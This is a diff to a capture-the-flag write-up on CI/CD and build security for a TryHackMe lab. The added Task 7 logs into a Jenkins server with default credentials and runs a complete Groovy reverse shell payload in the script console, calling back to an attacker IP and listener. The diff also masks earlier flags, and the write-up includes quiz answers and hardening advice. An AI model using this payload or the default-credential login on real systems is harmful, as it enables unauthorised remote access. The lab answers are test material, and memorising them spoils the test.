@@ -387,7 +387,7 @@ Now we can unzip all the zip files & use `grep -R` to search for hardcodede API 
 ```bash
 ┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security/unzip]
 └─# grep -R "API" ./   
-./mobile-app-master-7a790d318f6ff34861b7903cf61d1810b67cf741/Dockerfile:ENV ANDROID_API_KEY "THM{You.Found.The.API.Key}"
+./mobile-app-master-7a790d318f6ff34861b7903cf61d1810b67cf741/Dockerfile:ENV ANDROID_API_KEY "THM{Y*********Key}"
 ./mobile-app-master-7a790d318f6ff34861b7903cf61d1810b67cf741/README.md:up your secret API key. The stub code is here for that, but please see our
 ./mobile-app-master-7a790d318f6ff34861b7903cf61d1810b67cf741/app/app.iml:    <orderEntry type="jdk" jdkName="Android API 28 Platform" jdkType="Android SDK" />
 ```
@@ -408,7 +408,7 @@ In GitLab, group-based access control is a powerful mechanism that simplifies pe
 > 1. Which file specifies which directories and files should be excluded for version control? - `.gitignore`
 > 2. What can you protect to ensure direct pushes and vulnerable code changes are avoided? - `branches`
 > 3. What issue does lack of access control and unauthorised code changes lead to? - `Unauthorised Tampering` 
-> 4. What is the API key stored within the Mobile application that can be accessed by any Gitlab user? - `THM{You.Found.The.API.Key}`
+> 4. What is the API key stored within the Mobile application that can be accessed by any Gitlab user? - `THM{You**********Key}`
 
 
 ## Task 6 : Securing the Build Process
@@ -495,5 +495,66 @@ Protecting the build process is key to ensuring vulnerabilities are avoided at t
 > 1. Where should you store artefacts to prevent tampering? - `secure registry`
 > 2. What mechanism should you always use to store and inject sensitive data? - `secret management`
 > 3. What attack can malicious actors perform to inject malicious code in the build process? - `Dependency Confusion`
-> 4. Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1? - `THM{7753f7e9-6543-4914-90ad-7153609831c3}`
+> 4. Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1? - `THM{77**********31c3}`
+
+## Task 7 : Securing the Build Server
+
+The next point of attack is the build server itself! If an attacker can gain access or control of our build server, this places them in quite a privileged position to compromise both the pipeline and the build.
+
+### Build Server Basics -
+
+The simplest point to start is with access. Even in modern times, a common attack against build infrastructure is to _guess credentials and gain access_. Whenever a Jenkins server is available in oopen internet, suprisingly  many times `jenkins:jenkins` would do the trick!
+
+To secure our build server, we want to restrict access to it. You would often find that multiple members have access to the same build server. In these cases, we need to apply granular access to ensure that a compromise of one user would not lead to the compromise of all builds.
+
+### Exposed Build Server -
+
+Jenkins build server is at - http://jenkins.tryhackme.loc:8080/
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/1d5a8813-f5b3-47c9-b07c-ccdc62ae7b5d)
+
+We can login with default credentials - `jenkins:jenkins`
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/c3ea6b6e-c0d3-4a6c-a383-a2104747be6d)
+
+We can use the Jenkins script console (http://jenkins.tryhackme.loc:8080/script) to get a reverse shell on the Jenkins server.
+
+**Reverse shell payload:**
+```groovy
+String host="10.xx.xx.xx";int port=9001;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/5666b13c-8220-499f-95c9-d4d598def8eb)
+
+Once we click **Run**, we get a reverse shell back to our machine.
+
+```bash
+┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
+└─# nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.50.75.24] from (UNKNOWN) [10.200.94.160] 37584
+
+jenkins@ip-10-200-94-160:/flag$ id
+id
+uid=115(jenkins) gid=123(jenkins) groups=123(jenkins)
+```
+
+### Protecting the Build Server -
+
+The following steps can be followed to protect both your build server and build agents:
+
+- **Build Agent Configuration:** Configure build agents to only communicate with the build server, avoiding external exposure.
+- **Private Network:** Place build agents within a private network, preventing direct internet access.
+- **Firewalls:** Employ firewalls to restrict incoming connections to necessary Build server-related traffic.
+- **VPN:** Use a VPN to access the build server and its agents securely from remote locations.
+- **Token-Based Authentication:** Utilise build agent tokens for authentication, adding an extra layer of security.
+- **SSH Keys:** For SSH-based build agents, use secure SSH keys for authentication.
+- **Continuous Monitoring:** Regularly monitor build agent activities and logs for unusual behaviour.
+- **Regular Updates:** Update both the build server and agents with security patches.
+- **Security Audits:** Conduct periodic security audits to identify and address vulnerabilities.
+- **Remove Defaults and Harden Configuration:** Make sure to harden your build server and remove all default credentials and weak configurations.
+
+> 1. What can be used to ensure that remote access to the build server can be performed securely? - `vpn`
+> 2. What can be used to add an additional layer of authentication security for build agents? - `Token-based authentication`
+> 3. Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2? - `THM{1769f7*********15cc}`
+
 
